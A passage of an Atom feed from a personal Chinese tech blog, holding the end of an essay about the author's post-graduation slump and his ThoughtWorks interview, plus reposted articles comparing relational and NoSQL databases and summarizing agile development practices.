&lt;p&gt;那种孤独是我这辈子都会记得的。&lt;/p&gt;
&lt;p&gt;北京的雪，多美啊。一觉醒来，竟然看到了北京的初雪，那是那段日子里唯一美好的记忆。&lt;/p&gt;
&lt;p&gt;几乎没有悬念的，我回到了成都。&lt;/p&gt;
&lt;p&gt;我以为我的梦想死了。我以为我对事业不会再抱有激情了，就在这个时候，我和我的女朋友分手了。&lt;/p&gt;
&lt;p&gt;生活还得继续，我继续在一家科技公司做着不知道为什么要做的工作。&lt;/p&gt;
&lt;p&gt;在公司我觉得我是个挣钱的机器，回到家我觉得我活着就是为了活着，没有什么激情，也没有什么朋友。&lt;/p&gt;
&lt;p&gt;中间收到几个朋友的消息，得知我们很看好的一对对都分了。&lt;/p&gt;
&lt;p&gt;毕业是一个改造我们世界观的转折点。&lt;/p&gt;
&lt;p&gt;就这样过了一阵，我以为我已经死了。&lt;/p&gt;
&lt;p&gt;我以为再也不会有一份工作让我不要工资都愿意干了，&lt;/p&gt;
&lt;p&gt;我以为再也不会有一份事业是和钱无关的，&lt;/p&gt;
&lt;p&gt;我以为再也没有把碗擦肩的兄弟，一起闯荡江湖的热情了。&lt;/p&gt;
&lt;p&gt;就在这个时候，我遇到了thoughtworks。&lt;/p&gt;
&lt;p&gt;thoughtworks让我重新找回了自我。&lt;/p&gt;
&lt;p&gt;很久没有那种早上恨不得起的更早，晚上伸伸懒腰觉得又是充实的一天的日子了。&lt;/p&gt;
&lt;p&gt;从接到面试邀请，到正式进入公司面试，差不多一个月时间，我每天都在充满希望的读过，&lt;/p&gt;
&lt;p&gt;如饥似渴地学习，填满我空空如也大脑，几乎是种病态的对知识的渴望，我的身体和大脑都处于极度饥渴的状态，&lt;/p&gt;
&lt;p&gt;不断地学习计算机底层的东西，了解自己用过的东西的原理。&lt;/p&gt;
&lt;p&gt;重新翻出大学的课本，温习错过的知识。&lt;/p&gt;
&lt;p&gt;想起当年老师在台上讲的都是被我判定为无用的知识，我认定了自己以后不会做这行，我以为我会是个优秀的导演，可就像刚进剧组愿意做好一个场务，那为什么做为一个大学生，你不先学好你的本专业？&lt;/p&gt;
&lt;p&gt;我意识到这点了，还好我还年轻，我把以前的知识都翻出来看了一遍，还好不是很陌生。&lt;/p&gt;
&lt;p&gt;我又从网上找了很多资料一一阅读，我感受到了学习的快乐，有一种上天入地的感觉。&lt;/p&gt;
&lt;p&gt;现实的世界太狭窄，在知识的海洋里我们都拥有无限的可能。&lt;/p&gt;
&lt;p&gt;我感觉内心深处，自己慢慢醒来。&lt;/p&gt;
&lt;p&gt;重新开始学习，重新开始看书，重新抱起了我的吉他。&lt;/p&gt;
&lt;p&gt;生活开始有了希望，我的脸上浮现出了微笑。&lt;/p&gt;
&lt;p&gt;为了面试，我跟公司领导们撒了谎，对不起，因为我意识到我此刻有一件重要的事请要去做，他可能改变我事业的起点，&lt;/p&gt;
&lt;p&gt;然而当我做出这个决定，我已经被悄悄改变了。&lt;/p&gt;
&lt;p&gt;不管结果怎样，谢谢thoughtworks，谢谢你唤醒了我对生活的激情，有种缘分叫命中注定。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;今天是2016年4月20日&lt;/p&gt;
&lt;p&gt;地点在成都武侯区的一间电梯公寓&lt;br&gt;
    
    </summary>
    
    
      <category term="thoughtworks" scheme="http://adu.404nf.cn/tags/thoughtworks/"/>
    
  </entry>
  
  <entry>
    <title>RDBMS和NOSQL的技术差别</title>
    <link href="http://adu.404nf.cn/2016/04/20/RDBMS%E5%92%8CNOSQL%E7%9A%84%E6%8A%80%E6%9C%AF%E5%B7%AE%E5%88%AB/"/>
    <id>http://adu.404nf.cn/2016/04/20/RDBMS和NOSQL的技术差别/</id>
    <published>2016-04-20T02:01:24.000Z</published>
    <updated>2016-04-20T02:04:04.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;RDBMS和NOSQL的技术差别&quot;&gt;&lt;a href=&quot;#RDBMS和NOSQL的技术差别&quot; class=&quot;headerlink&quot; title=&quot;RDBMS和NOSQL的技术差别&quot;&gt;&lt;/a&gt;RDBMS和NOSQL的技术差别&lt;/h1&gt;&lt;p&gt;创新的背后往往会刺激痛苦。这一点在PDD(我们亲切地称为痛处驱动开发)软件开发领域尤为真实。从上世纪80年代以来，我们就都知道如何处理关系型数据——只要把数据放到关系型数据库管理系统(RDBMS)中，就可以使用SQL语句操作数据。然而，在过去几年来，我们的行业采纳NoSQL数据库的趋势在增长，数据不见得都在关系型数据库中存储了。&lt;/p&gt;
&lt;p&gt;诚然，在互联网上有成千上万关于选择SQL还是NoSQL的辩论。但是，这两者是不是必须站在对立面战斗呢？如果你选择一种或另一种，你知道为什么做选择，知道各自有何潜在益处吗？本文简要地讨论了SQL和NoSQL两种方法最常见的优点和缺点，包括简单的比较和开发者考虑的因素。像别的一些话题一样，这个问题没有对错，永远正确的经典答案依然是：具体问题具体分析。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;数据表VS-数据集&quot;&gt;&lt;a href=&quot;#数据表VS-数据集&quot; class=&quot;headerlink&quot; title=&quot;数据表VS.数据集&quot;&gt;&lt;/a&gt;数据表VS.数据集&lt;/h2&gt;&lt;p&gt;关系型和非关系型数据库的主要差异是数据存储的方式。关系型数据天然就是表格式的，因此存储在数据表的行和列中。数据表可以彼此关联协作存储，也很容易提取数据。与其相反，非关系型数据不适合存储在数据表的行和列中，而是大块组合在一起。非关系型数据通常存储在数据集中，就像文档、键值对或者图结构。你的数据及其特性是选择数据存储和提取方式的首要影响因素。&lt;/p&gt;
&lt;h2 id=&quot;预定义结构VS-动态结构&quot;&gt;&lt;a href=&quot;#预定义结构VS-动态结构&quot; class=&quot;headerlink&quot; title=&quot;预定义结构VS.动态结构&quot;&gt;&lt;/a&gt;预定义结构VS.动态结构&lt;/h2&gt;&lt;p&gt;关系型数据通常对应于结构化数据，因为数据表都有预定义好的结构(列的定义)，结构描述了数据的形式和内容。这一点对数据建模至关重要，你必须“第一时间先把结构定义好”。虽然预定义结构带来了可靠性和稳定性，但是已经存入数据的表结构要修改就非常痛苦了。另一方面，非关系型数据基于动态结构，通常适用于非结构化数据。非关系型数据可以很容易适应数据类型和结构的变化，因为动态结构本身就支持这一点。&lt;/p&gt;
&lt;h2 id=&quot;存储规范化VS存储代价&quot;&gt;&lt;a href=&quot;#存储规范化VS存储代价&quot; class=&quot;headerlink&quot; title=&quot;存储规范化VS存储代价&quot;&gt;&lt;/a&gt;存储规范化VS存储代价&lt;/h2&gt;&lt;p&gt;关系型数据库的数据存储是为了更高的规范性，把数据分隔成最小的逻辑表(关系表)以避免重复，获得最精简的空间利用。虽然数据规范性会使数据管理更清晰，但它通常也会带来一点点复杂性，尤其是单个操作可能涉及多个关系表的时候，数据管理就有点麻烦。另外，更精简的空间利用通常可以节约宝贵的数据存储，但是在当今世界我们基本可以认为存储的代价(磁盘空间)是微不足道的。而非关系型数据存储在平面数据集中，数据经常可能存在重复。单个数据库很少被分隔开，而是存储成一个整体，这样是为了整块数据更容易读写。&lt;/p&gt;
&lt;h2 id=&quot;纵向扩容VS横向扩容&quot;&gt;&lt;a href=&quot;#纵向扩容VS横向扩容&quot; class=&quot;headerlink&quot; title=&quot;纵向扩容VS横向扩容&quot;&gt;&lt;/a&gt;纵向扩容VS横向扩容&lt;/h2&gt;&lt;p&gt;SQL和NoSQL数据库最大的差别可能是在扩展方式上，要支持日益增长的需求当然要扩展。要支持更多并发量，SQL数据库是纵向扩展，也就是说提高处理能力，使用速度更快速的计算机，这样处理相同的数据集就更快了。因为数据存储在关系表中，操作的性能瓶颈可能涉及很多个表，这都需要通过提高计算机性能来客服。虽然SQL数据库有很大扩展空间，但最终肯定会达到纵向扩展的上限。而NoSQL数据库是横向扩展的。非关系型数据存储天然就是分布式的，NoSQL数据库的扩展可以通过给资源池添加更多普通的数据库服务器(节点)来分担负载。&lt;/p&gt;
&lt;h2 id=&quot;结构化查询VS非结构化查询&quot;&gt;&lt;a href=&quot;#结构化查询VS非结构化查询&quot; class=&quot;headerlink&quot; title=&quot;结构化查询VS非结构化查询&quot;&gt;&lt;/a&gt;结构化查询VS非结构化查询&lt;/h2&gt;&lt;p&gt;关系型数据库通过所谓结构化查询语言(也就是我们常说的SQL)来操作数据。SQL支持数据库CRUD(增加，查询，更新，删除)操作的功能非常强大，是业界标准用法。非关系型数据库以块(像文档一样)为单元操纵数据，使用所谓的非结构化查询语言(UnQL)，它是没有标准的，因数据库提供商的不同而不同。关系型表中主键的概念对应非关系存储中的文档Id。SQL数据库使用预定义优化方式(比如列索引定义)帮助加速查询操作，而NoSQL数据库采用更简单而精确的数据访问模式。&lt;/p&gt;
&lt;h2 id=&quot;映射VS本地化&quot;&gt;&lt;a href=&quot;#映射VS本地化&quot; class=&quot;headerlink&quot; title=&quot;映射VS本地化&quot;&gt;&lt;/a&gt;映射VS本地化&lt;/h2&gt;&lt;p&gt;SQL和NoSQL数据存储的选择还取决于开发人员，尽管这个因素影响不大。采用面向对象编程语言的开发人员通常会同时操作一个或多个数据实体(包括嵌套数据、列表和数组的复杂结构)，把数据传递给应用程序用户界面。要是讨论到底层数据库，事情就并不总是那么公平合理了。在关系型存储中，数据实体通常需要分成多个部分进行规范化，然后分开存储到多个关系型表中精简存储。幸运的是，这是一个长期存在的问题，大部分编程平台都有相应的简单解决方案，比如ORM层(对象关系映射)。ORM是位于关系型数据源和开发者使用的面向对象数据实体之间的一个映射层。然而，对于非关系型存储，不需要规范化数据，复杂数据实体可以整体存放在独立单元中。应用程序中使用的对象通常序列化为JSon串，存储在NoSQL数据库的JSon文档中。&lt;/p&gt;
&lt;h2 id=&quot;事务性VS纯扩展性&quot;&gt;&lt;a href=&quot;#事务性VS纯扩展性&quot; class=&quot;headerlink&quot; title=&quot;事务性VS纯扩展性&quot;&gt;&lt;/a&gt;事务性VS纯扩展性&lt;/h2&gt;&lt;p&gt;如果你的数据操作需要高事务性或者复杂数据查询需要控制执行计划，那么传统的SQL数据库从性能和稳定性方面考虑是你的最佳选择。SQL数据库支持对事务原子性细粒度控制，并且易于回滚事务。虽然NoSQL数据库也可以使用事务操作，但它们真正闪亮的价值是在操作的扩展性和大数据量处理方面。&lt;/p&gt;
&lt;h2 id=&quot;ACID-VS-CAP&quot;&gt;&lt;a href=&quot;#ACID-VS-CAP&quot; class=&quot;headerlink&quot; title=&quot;ACID VS CAP&quot;&gt;&lt;/a&gt;ACID VS CAP&lt;/h2&gt;&lt;p&gt;SQL 数据库久负盛名的价值就是通过所谓的ACID属性(原子性，一致性，隔离性，持久性)保证数据完整性，大部分关系型存储供应商都支持ACID。我们的目标是支持隔离不可分割的事务，其变化是持久的，数据也保持一致状态。而NoSQL数据库是让你在CAP(一致性，可用性，分区容忍度)中的任意两项中选择，因为在基于节点的分布式系统中，很难做到三项都满足。&lt;/p&gt;
&lt;h2 id=&quot;数据VS大数据&quot;&gt;&lt;a href=&quot;#数据VS大数据&quot; class=&quot;headerlink&quot; title=&quot;数据VS大数据&quot;&gt;&lt;/a&gt;数据VS大数据&lt;/h2&gt;&lt;p&gt;SQL数据库可以可靠地存储和处理数据，而NoSQL最大的优势是在应对大数据方面，也就是由我们社会或者计算机每天产生的大量非结构化的数据实体。NoSQL用无模式方式做数据管理，所以其横向扩展潜力是无限的，这可能是深度处理大数据捕获、管理、检索、分析和可视化的唯一有效途径。&lt;/p&gt;
&lt;h2 id=&quot;数据记录VS物联网和人联网&quot;&gt;&lt;a href=&quot;#数据记录VS物联网和人联网&quot; class=&quot;headerlink&quot; title=&quot;数据记录VS物联网和人联网&quot;&gt;&lt;/a&gt;数据记录VS物联网和人联网&lt;/h2&gt;&lt;p&gt;关系数据库在关注数据规范化和保证性能的基础上精简存储。但是近年来，我们产生数据的速度远大于关系型存储能满足存储的能力增长。刺激数据如此迅猛增长的原因是：巨大量的用户数和物联网。连接到互联网的用户在成倍增加，在同步使用我们的应用。由于大量移动设备数据传感设备接入互联网，机器产生的数据量也大幅增加。因此企业必须寻求NoSQL技术及基础架构来处理持续涌入的半结构化和非结构化数据。&lt;/p&gt;
&lt;h2 id=&quot;内部部署VS云计算&quot;&gt;&lt;a href=&quot;#内部部署VS云计算&quot; class=&quot;headerlink&quot; title=&quot;内部部署VS云计算&quot;&gt;&lt;/a&gt;内部部署VS云计算&lt;/h2&gt;&lt;p&gt;云计算现在已经无处不在了，它兼具SQL和NoSQL数据库的益处。云环境中的关系型存储通常是以服务形式提供的，是可复制、高可用性且分布式的，极大地提高了横向扩展能力。托管于云服务中的NoSQL数据库也天然享有自动分片的好处，可以阶段性地灵活弹性处理，集成高速缓存和巨大的计算能力来捕获、存储和分析大数据。&lt;/p&gt;
&lt;h2 id=&quot;付费VS开源&quot;&gt;&lt;a href=&quot;#付费VS开源&quot; class=&quot;headerlink&quot; title=&quot;付费VS开源&quot;&gt;&lt;/a&gt;付费VS开源&lt;/h2&gt;&lt;p&gt;有一种看法认为，SQL数据库大多数比较昂贵，而NoSQL数据库通常都是开源的。事实上，两种类型数据库都有开源的和商业的。常见的SQL 数据库有微软公司的SQL Server，MySQL，SQLite，Oracle和PostGres。流行的NoSQL数据库有Couchbase，MongoDB，Redis，BigTable和RavenDB。&lt;/p&gt;
&lt;h1 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h1&gt;&lt;p&gt;就像Neo之于Matrix，你可以选择。幸福的无知和幻想或者接受残酷的现实。但是，盲目选择使用SQL还是NoSQL技术，或者根据大众需求选择都是在幻想有魔法会自动选择合适的方案。SQL和NoSQL这两者都有各自的优缺点，选择正确的架构取决于你构建应用的需求。传统SQL数据库依然非常强大，可以可靠地处理你的事务性需求并保持完整性。只有在你接近关系数据库局限性边缘时，或者你的数据处理量浩如烟海时，操作扩展需要更加分布式的系统时，才考虑NoSQL方案。考虑这些因素之后再做选择，你就可以变成释放你的数据构建下一代应用令人叹为观止的神人。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.36dsj.com/archives/16986&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RDBMS和NOSQL的技术差别&quot;&gt;&lt;a href=&quot;#RDBMS和NOSQL的技术差别&quot; class=&quot;headerlink&quot; title=&quot;RDBMS和NOSQL的技术差别&quot;&gt;&lt;/a&gt;RDBMS和NOSQL的技术差别&lt;/h1&gt;&lt;p&gt;创新的背后往往会刺激痛苦。这一点在PDD(我们亲切地称为痛处驱动开发)软件开发领域尤为真实。从上世纪80年代以来，我们就都知道如何处理关系型数据——只要把数据放到关系型数据库管理系统(RDBMS)中，就可以使用SQL语句操作数据。然而，在过去几年来，我们的行业采纳NoSQL数据库的趋势在增长，数据不见得都在关系型数据库中存储了。&lt;/p&gt;
&lt;p&gt;诚然，在互联网上有成千上万关于选择SQL还是NoSQL的辩论。但是，这两者是不是必须站在对立面战斗呢？如果你选择一种或另一种，你知道为什么做选择，知道各自有何潜在益处吗？本文简要地讨论了SQL和NoSQL两种方法最常见的优点和缺点，包括简单的比较和开发者考虑的因素。像别的一些话题一样，这个问题没有对错，永远正确的经典答案依然是：具体问题具体分析。&lt;br&gt;
    
    </summary>
    
      <category term="SQL" scheme="http://adu.404nf.cn/categories/SQL/"/>
    
    
      <category term="Nosql" scheme="http://adu.404nf.cn/tags/Nosql/"/>
    
      <category term="RDBMS" scheme="http://adu.404nf.cn/tags/RDBMS/"/>
    
  </entry>
  
  <entry>
    <title>敏捷开发</title>
    <link href="http://adu.404nf.cn/2016/04/19/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"/>
    <id>http://adu.404nf.cn/2016/04/19/敏捷开发/</id>
    <published>2016-04-19T06:41:46.000Z</published>
    <updated>2016-04-19T07:46:19.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;敏捷开发&quot;&gt;&lt;a href=&quot;#敏捷开发&quot; class=&quot;headerlink&quot; title=&quot;敏捷开发&quot;&gt;&lt;/a&gt;敏捷开发&lt;/h1&gt;&lt;p&gt;敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态。&lt;br&gt; &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://img.blog.csdn.net/20140328151407843?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbGl1Y2h1bm1pbmcwMzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;123.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Test-Driven-Development，测试驱动开发。&quot;&gt;&lt;a href=&quot;#Test-Driven-Development，测试驱动开发。&quot; class=&quot;headerlink&quot; title=&quot;Test-Driven Development，测试驱动开发。&quot;&gt;&lt;/a&gt;Test-Driven Development，测试驱动开发。&lt;/h2&gt;&lt;p&gt;　　它是敏捷开发的最重要的部分。在ThoughtWorks，我们实现任何一个功能都是从测试开始，首先对业务需求进行分析，分解为一个一个的Story，记录在Story Card上。然后两个人同时坐在电脑前面，一个人依照Story，从业务需求的角度来编写测试代码，另一个人看着他并且进行思考，如果有不同的意见就会提出来进行讨论，直到达成共识，这样写出来的测试代码就真实反映了业务功能需求。接着由另一个人控制键盘，编写该测试代码的实现。如果没有测试代码，就不能编写功能的实现代码。先写测试代码，能够让开发人员明确目标，就是让测试通过。&lt;/p&gt;
&lt;h2 id=&quot;Continuous-Integration，持续集成。&quot;&gt;&lt;a href=&quot;#Continuous-Integration，持续集成。&quot; class=&quot;headerlink&quot; title=&quot;Continuous Integration，持续集成。&quot;&gt;&lt;/a&gt;Continuous Integration，持续集成。&lt;/h2&gt;&lt;p&gt;　　在以往的软件开发过程中，集成是一件很痛苦的事情，通常很长时间才会做一次集成，这样的话，会引发很多问题，比如 build未通过或者单元测试失败。敏捷开发中提倡持续集成，一天之内集成十几次甚至几十次，如此频繁的集成能尽量减少冲突，由于集成很频繁，每一次集成的改变也很少，即使集成失败也容易定位错误。一次集成要做哪些事情呢？它至少包括：获得所有源代码、编译源代码、运行所有测试，包括单元测试、功能测试等；确认编译和测试是否通过，最后发送报告。当然也会做一些其它的任务，比如说代码分析、测试覆盖率分析等等。&lt;/p&gt;
&lt;h2 id=&quot;Refactoring，重构。&quot;&gt;&lt;a href=&quot;#Refactoring，重构。&quot; class=&quot;headerlink&quot; title=&quot;Refactoring，重构。&quot;&gt;&lt;/a&gt;Refactoring，重构。&lt;/h2&gt;&lt;p&gt;　　相信大家对它都很熟悉了，有很多很多的书用来介绍重构，最著名的是Martin的《重构》，Joshua的《从重构到模式》等。重构是在不改变系统外部行为下，对内部结构进行整理优化，使得代码尽量简单、优美、可扩展。在以往开发中，通常是在有需求过来，现在的系统架构不容易实现，从而对原有系统进行重构；或者在开发过程中有剩余时间了，对现在代码进行重构整理。但是在敏捷开发中，重构贯穿于整个开发流程，每一次开发者check in代码之前，都要对所写代码进行重构，让代码达到clean code that works。值得注意的是，在重构时，每一次改变要尽可能小，用单元测试来保证重构是否引起冲突，并且不只是对实现代码进行重构，如果测试代码中有重复，也要对它进行重构。&lt;/p&gt;
&lt;h2 id=&quot;Pair-Programming，结对编程。&quot;&gt;&lt;a href=&quot;#Pair-Programming，结对编程。&quot; class=&quot;headerlink&quot; title=&quot;Pair-Programming，结对编程。&quot;&gt;&lt;/a&gt;Pair-Programming，结对编程。&lt;/h2&gt;&lt;p&gt;　　在敏捷开发中，做任何事情都是Pair的，包括分析、写测试、写实现代码或者重构。Pair做事有很多好处，两个人在一起探讨很容易产生思想的火花，也不容易走上偏路。在我们公司，还有很多事都是Pair来做，比如Pair学习，Pair翻译，Pair做PPT，关于这个话题，钱钱同学有一篇很有名的文章对它进行介绍，名为Pair Programming (结对编程)。&lt;/p&gt;
&lt;h2 id=&quot;Stand-meeting，站立会议。&quot;&gt;&lt;a href=&quot;#Stand-meeting，站立会议。&quot; class=&quot;headerlink&quot; title=&quot;Stand meeting，站立会议。&quot;&gt;&lt;/a&gt;Stand meeting，站立会议。&lt;/h2&gt;&lt;p&gt;　　每天早上，项目组的所有成员都会站立进行一次会议，由于是站立的，所以时间不会很长，一般来说是15-20分钟。会议的内容并不是需求分析、任务分配等，而是每个人都回答三个问题：1. 你昨天做了什么？2. 你今天要做什么？ 3. 你遇到了哪些困难？站立会议让团队进行交流，彼此相互熟悉工作内容，如果有人曾经遇到过和你类似的问题，那么在站立会议后，他就会和你进行讨论。&lt;/p&gt;
&lt;h2 id=&quot;Frequent-Releases，小版本发布。&quot;&gt;&lt;a href=&quot;#Frequent-Releases，小版本发布。&quot; class=&quot;headerlink&quot; title=&quot;Frequent Releases，小版本发布。&quot;&gt;&lt;/a&gt;Frequent Releases，小版本发布。&lt;/h2&gt;&lt;p&gt;　　在敏捷开发中，不会出现这种情况，拿到需求以后就闭门造车，直到最后才将产品交付给客户，而是尽量多的产品发布，一般以周、月为单位。这样，客户每隔一段时间就会拿到发布的产品进行试用，而我们可以从客户那得到更多的反馈来改进产品。正因为发布频繁，每一个版本新增的功能简单，不需要复杂的设计，这样文档和设计就在很大程度上简化了。又因为简单设计，没有复杂的架构，所以客户有新的需求或者需求进行变动，也能很快的适应。&lt;/p&gt;
&lt;h2 id=&quot;Minimal-Documentation，较少的文档。&quot;&gt;&lt;a href=&quot;#Minimal-Documentation，较少的文档。&quot; class=&quot;headerlink&quot; title=&quot;Minimal Documentation，较少的文档。&quot;&gt;&lt;/a&gt;Minimal Documentation，较少的文档。&lt;/h2&gt;&lt;p&gt;　　其实敏捷开发中并不是没有文档，而是有大量的文档，即测试。这些测试代码真实的反应了客户的需求以及系统API 的用法，如果有新人加入团队，最快的熟悉项目的方法就是给他看测试代码，而比一边看着文档一边进行debug要高效。如果用书面文档或者注释，某天代码变化了，需要对这些文档进行更新。一旦忘记更新文档，就会出现代码和文档不匹配的情况，这更加会让人迷惑。而在敏捷中并不会出现，因为只有测试变化了，代码才会变化，测试是真实反应代码的。这时有人会问：代码不写注释行吗？一般来说好的代码不是需要大量的注释吗？其实简单可读的代码才是好的代码，既然简单可读了，别人一看就能够看懂，这时候根本不需要对代码进行任何注释。若你觉得这段代码不加注释的话别人可能看不懂，就表示设计还不够简单，需要对它进行重构。&lt;/p&gt;
&lt;h2 id=&quot;Collaborative-Focus，以合作为中心，表现为代码共享。&quot;&gt;&lt;a href=&quot;#Collaborative-Focus，以合作为中心，表现为代码共享。&quot; class=&quot;headerlink&quot; title=&quot;Collaborative Focus，以合作为中心，表现为代码共享。&quot;&gt;&lt;/a&gt;Collaborative Focus，以合作为中心，表现为代码共享。&lt;/h2&gt;&lt;p&gt;　　在敏捷开发中，代码是归团队所有而不是哪些模块的代码属于哪些人，每个人都有权利获得系统任何一部分的代码然后修改它，如果有人看到某些代码不爽的话，那他能够对这部分代码重构而不需要征求代码作者的同意，很可能也不知道是谁写的这部分代码。这样每个人都能熟悉系统的代码，即使团队的人员变动，也没有风险。&lt;/p&gt;
&lt;h2 id=&quot;Customer-Engagement-，现场客户。&quot;&gt;&lt;a href=&quot;#Customer-Engagement-，现场客户。&quot; class=&quot;headerlink&quot; title=&quot;Customer Engagement ，现场客户。&quot;&gt;&lt;/a&gt;Customer Engagement ，现场客户。&lt;/h2&gt;&lt;p&gt;　　敏捷开发中，客户是与开发团队一起工作的，团队到客户现场进行开发或者邀请客户到团队公司里来开发。如果开发过程中有什么问题或者产品经过一个迭代后，能够以最快速度得到客户的反馈。&lt;/p&gt;
&lt;h2 id=&quot;Automated-Testing-，自动化测试。&quot;&gt;&lt;a href=&quot;#Automated-Testing-，自动化测试。&quot; class=&quot;headerlink&quot; title=&quot;Automated Testing ，自动化测试。&quot;&gt;&lt;/a&gt;Automated Testing ，自动化测试。&lt;/h2&gt;&lt;p&gt;　　为了减小人力或者重复劳动，所有的测试包括单元测试、功能测试或集成测试等都是自动化的，这对QA人员提出了更高的要求。他们要熟悉开发语言、自动化测试工具，能够编写自动化测试脚本或者用工具录制。我们公司在自动化测试上做了大量的工作，包括Selenium开源项目。&lt;/p&gt;
&lt;h2 id=&quot;Adaptive-Planning，可调整计划。&quot;&gt;&lt;a href=&quot;#Adaptive-Planning，可调整计划。&quot; class=&quot;headerlink&quot; title=&quot;Adaptive Planning，可调整计划。&quot;&gt;&lt;/a&gt;Adaptive Planning，可调整计划。&lt;/h2&gt;&lt;p&gt;　　敏捷开发中计划是可调整的，并不是像以往的开发过程中，需求分析-&amp;gt;概要设计-&amp;gt;详细设计-&amp;gt;开发 -&amp;gt;测试-&amp;gt;交付，每一个阶段都是有计划的进行，一个阶段结束便开始下一个阶段。而敏捷开发中只有一次一次的迭代，小版本的发布，根据客户反馈随时作出相应的调整和变化。
　　&lt;/p&gt;
&lt;p&gt;   敏捷开发过程与传统的开发过程有很大不同，在这过程中，团队是有激情有活力的，能适应更大的变化，做出更高质量的软件。        &lt;/p&gt;
&lt;h2 id=&quot;敏捷宣言：四中核心价值观和十二条原则&quot;&gt;&lt;a href=&quot;#敏捷宣言：四中核心价值观和十二条原则&quot; class=&quot;headerlink&quot; title=&quot;敏捷宣言：四中核心价值观和十二条原则&quot;&gt;&lt;/a&gt;敏捷宣言：四中核心价值观和十二条原则&lt;/h2&gt;&lt;p&gt;我们一直在实践中探寻更好的软件开发方法，身体力行的同时也帮助他人。由此我们建立了如下价值观：&lt;br&gt;个体和互动 高于 流程和工具&lt;br&gt;工作的软件 高于 详尽的文档&lt;br&gt;客户合作 高于 合同谈判&lt;br&gt;响应变化 高于 遵循计划&lt;br&gt;也就是说，尽管右项有其价值，我们更重视左项的价值。&lt;br&gt;我们遵循以下原则：&lt;br&gt;我们最重要的目标，是通过持续不断地及早交付有价值的软件使客户满意。&lt;br&gt;欣然面对需求变化，即使在开发后期也一样。善于掌控变化，帮助客户获得竞争优势。&lt;br&gt;经常地交付可工作的软件，相隔几星期或一两个月，倾向于采取较短的周期。&lt;br&gt;业务人员和开发人员必须相互合作，项目中的每一天都不例外。&lt;br&gt;激发个体的斗志，以他们为核心搭建项目。提供他们所需的环境和支持，相信他们能够达成目标。&lt;br&gt;不论团队内外，传递信息效果最好效率也最高的方式是面对面的交谈。&lt;br&gt;可工作的软件是进度的首要度量标准。&lt;br&gt;敏捷过程倡导可持续开发。责任人、开发人员和用户要能够共同维持其步调稳定延续。&lt;br&gt;对技术精益求精，对设计不断完善，将提高敏捷能力。&lt;br&gt;以简洁为本，极力减少不必要工作量。&lt;br&gt;最好的架构、需求和设计出自于自组织的团队。&lt;br&gt;团队定期地反思如何能提高成效，并依此调整团队的行为。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/burningsheep/article/details/7725181&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接1&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/liuchunming033/article/details/22407569&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接2&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;敏捷开发&quot;&gt;&lt;a href=&quot;#敏捷开发&quot; class=&quot;headerlink&quot; title=&quot;敏捷开发&quot;&gt;&lt;/a&gt;敏捷开发&lt;/h1&gt;&lt;p&gt;敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态。&lt;br&gt;
    
    </summary>
    
      <category term="TDD" scheme="http://adu.404nf.cn/categories/TDD/"/>
    
    
      <category term="敏捷开发" scheme="http://adu.404nf.cn/tags/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"/>
    
      <category term="thoughtworks面试" scheme="http://adu.404nf.cn/tags/thoughtworks%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
</feed>
